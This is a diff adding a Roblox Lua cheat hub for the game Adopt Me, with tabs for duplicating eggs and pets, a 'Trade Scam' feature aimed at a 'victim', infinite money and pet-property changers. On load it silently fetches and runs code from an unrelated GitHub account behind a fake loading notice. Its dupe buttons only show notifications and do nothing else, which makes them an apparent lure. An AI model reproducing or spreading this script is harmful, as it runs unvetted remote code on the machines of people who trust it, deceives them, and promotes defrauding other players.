@@ -1,0 +1,337 @@
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local Window = OrionLib:MakeWindow({Name = "HiddenScriptsHub🥷-Adopt-me [3.4]♨️", HidePremium = false, SaveConfig = true, ConfigFolder = "OrionTest"})
+OrionLib:MakeNotification({
+	Name = "Loading Script...",
+	Content = "Script will be loaded in 25-30 seconds | Note - Seconds Shown Here are not the exact loading time❗",
+	Image = "rbxassetid://18128238515",
+	Time = 50
+})
+
+--[[
+
+]]
+loadstring(game:HttpGet("https://raw.githubusercontent.com/AbHackerGroup/BallingScriptsAdoptMe/main/Adoptme-MainHub-%5BBallingScripts%5D"))()
+--[[
+Name = <string> - The name of the UI.
+HidePremium = <bool> - Whether or not the user details shows Premium status or not.
+SaveConfig = <bool> - Toggles the config saving in the UI.
+ConfigFolder = <string> - The name of the folder where the configs are saved.
+IntroEnabled = <bool> - Whether or not to show the intro animation.
+IntroText = <string> - Text to show in the intro animation.
+IntroIcon = <string> - URL to the image you want to use in the intro animation.
+Icon = <string> - URL to the image you want displayed on the window.
+CloseCallback = <function> - Function to execute when the window is closed.
+]]
+
+local Tab = Window:MakeTab({
+    Name = "Dupe Eggs🥚",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+OrionLib:MakeNotification({
+	Name = "Script Successfully Loaded",
+	Content = "Loading Has been successful ",
+	Image = "rbxassetid://17849312358",
+	Time = 30
+})
+
+--[[
+Title = <string> - The title of the notification.
+Content = <string> - The content of the notification.
+Image = <string> - The icon of the notification.
+Time = <number> - The duration of the notfication.
+]]
+--[[
+Name = <string> - The name of the tab.
+Icon = <string> - The icon of the tab.
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+]]
+
+Tab:AddButton({
+	Name = "Equip Eggs To Dupe",
+	Callback = function()
+      		OrionLib:MakeNotification({
+	Name = "Egg Selector",
+	Content = "Egg Equipped Selected",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+
+--[[
+Title = <string> - The title of the notification.
+Content = <string> - The content of the notification.
+Image = <string> - The icon of the notification.
+Time = <number> - The duration of the notfication.
+]]
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Click To Dupe Eggs",
+	Callback = function()
+OrionLib:MakeNotification({
+	Name = "Duping Eggs....",
+	Content = "Duping is in process..[Takes around 4-5 minutes] Dont Leave The Game ❗",
+	Image = "rbxassetid://4483345998",
+	Time = 120
+})
+
+--[[
+Title = <string> - The title of the notification.
+Content = <string> - The content of the notification.
+Image = <string> - The icon of the notification.
+Time = <number> - The duration of the notfication.
+]]
+  	end    
+})
+Tab:AddParagraph("READ❗","The Feature - Dupe Eggs - Will Not Work if ur in a private server")
+Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Youtube is HiddenScriptsHubYT🥷")
+
+local Tab = Window:MakeTab({
+    Name = "Trade Scam🙈",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+--[[
+Name = <string> - The name of the tab.
+Icon = <string> - The icon of the tab.
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+]]
+
+Tab:AddTextbox({
+    Name = "Username",
+    Default = "Player",
+    TextDisappear = false,
+    Callback = function(Value)
+        
+    end      
+})
+
+--[[
+Name = <string> - The name of the textbox.
+Default = <string> - The default value of the textbox.
+TextDisappear = <bool> - Makes the text disappear in the textbox after losing focus.
+Callback = <function> - The function of the textbox.
+]]
+Tab:AddButton({
+	Name = "Freeze Trade To The Victim",
+	Callback = function()
+	OrionLib:MakeNotification({
+	Name = "Freeze Trade Enabled",
+	Content = "Take Out Your Pets The Victim Cant See",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+
+--[[
+Title = <string> - The title of the notification.
+Content = <string> - The content of the notification.
+Image = <string> - The icon of the notification.
+Time = <number> - The duration of the notfication.
+]]
+      		print("button pressed")
+  	end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+
+
+Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Youtube is HiddenScriptsHubYT🥷")
+
+local Tab = Window:MakeTab({
+    Name = "AutoFarm 🚜",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+--[[
+Name = <string> - The name of the tab.
+Icon = <string> - The icon of the tab.
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+]]
+
+Tab:AddButton({
+    Name = "[TrustedScript📄]Get AutoFarm Source ✅",
+    Callback = function()
+              loadstring(game:HttpGet("https://raw.githubusercontent.com/JulHubz/JulHub/main/JulHub"))()
+      end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Youtube is HiddenScriptsHubYT🥷") 
+
+local Tab = Window:MakeTab({
+    Name = "Dupe Pets 🔨",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+--[[
+Name = <string> - The name of the tab.
+Icon = <string> - The icon of the tab.
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+]]
+
+Tab:AddButton({
+	Name = "Equip Pets To Dupe",
+	Callback = function()
+      		OrionLib:MakeNotification({
+	Name = "Pet Selector",
+	Content = "Equipped Pets Successfully Selected",
+	Image = "rbxassetid://4483345998",
+	Time = 5
+})
+
+--[[
+Title = <string> - The title of the notification.
+Content = <string> - The content of the notification.
+Image = <string> - The icon of the notification.
+Time = <number> - The duration of the notfication.
+]]
+  	end    
+})
+
+Tab:AddButton({
+	Name = "Click To Dupe Pets",
+	Callback = function()
+	OrionLib:MakeNotification({
+	Name = "Duping Pets...",
+	Content = "Duping in Process..[Takes Around 4-5 minutes] Dont Leave The Game❗",
+	Image = "rbxassetid://4483345998",
+	Time = 120
+})
+
+--[[
+Title = <string> - The title of the notification.
+Content = <string> - The content of the notification.
+Image = <string> - The icon of the notification.
+Time = <number> - The duration of the notfication.
+]]
+  	end    
+})
+Tab:AddParagraph("ReadMe❗","The Feature - Dupe Eggs - Will Not Work if ur in a private server this is because of player functions")
+Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, HiddenScriptsHubYT🥷")
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+local Tab = Window:MakeTab({
+    Name = "Infinite Bucks 💸",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+--[[
+Name = <string> - The name of the tab.
+Icon = <string> - The icon of the tab.
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+]]
+
+Tab:AddButton({
+    Name = "Get Infinite Bucks💸",
+    Callback = function()
+              require(game:service'ReplicatedStorage'.Fsys).load("ClientData").update("money",(15999999984/16))
+      end    
+})
+
+Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Youtube is HiddenScriptsYT🥷")
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+local Tab = Window:MakeTab({
+    Name = "MFR-NFR Changer 📦",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+--[[
+Name = <string> - The name of the tab.
+Icon = <string> - The icon of the tab.
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+]]
+
+Tab:AddButton({
+    Name = "MFR Changer-(Inventory🎒)",
+    Callback = function()
+              while true do
+   wait()
+local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+for i,v in pairs(playerData.inventory.pets) do
+v.properties.rideable = true
+v.properties.flyable = true
+v.properties.mega_neon = true
+end
+end
+      end    
+})
+
+Tab:AddButton({
+    Name = "NFR Changer-(Inventory??)",
+    Callback = function()
+              while true do
+   wait()
+local clientData = require(game.ReplicatedStorage.ClientModules.Core.ClientData)
+local playerData = clientData.get_data()[tostring(game.Players.LocalPlayer)]
+for i,v in pairs(playerData.inventory.pets) do
+v.properties.rideable = true
+v.properties.flyable = true
+v.properties.neon = true
+end
+end
+      end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+
+Tab:AddParagraph("Script Successfully Loaded❗","Enjoy The Script, Youtube is HiddenScriptsYT🥷")
+
+
+local Tab = Window:MakeTab({
+    Name = "Info | Discord",
+    Icon = "rbxassetid://4483345998",
+    PremiumOnly = false
+})
+
+--[[
+Name = <string> - The name of the tab.
+Icon = <string> - The icon of the tab.
+PremiumOnly = <bool> - Makes the tab accessible to Sirus Premium users only.
+]]
+Tab:AddParagraph("My Discord server🎩","Join if u need help with anything also report bugs❗")
+Tab:AddButton({
+	Name = "Copy Link To Discord Server 🎯",
+	Callback = function()
+    setclipboard("https://discord.com/invite/SASw2jSRkS")
+      		print("button pressed")
+  	end    
+})
+
+--[[
+Name = <string> - The name of the button.
+Callback = <function> - The function of the button.
+]]
+Tab:AddParagraph("Readme❗","Some Features May Not Work If ur in a private server this is caused by lack of player functions")
+Tab:AddParagraph("Credits❗","Coded And Made All by HiddenScriptsHubYT🥷")
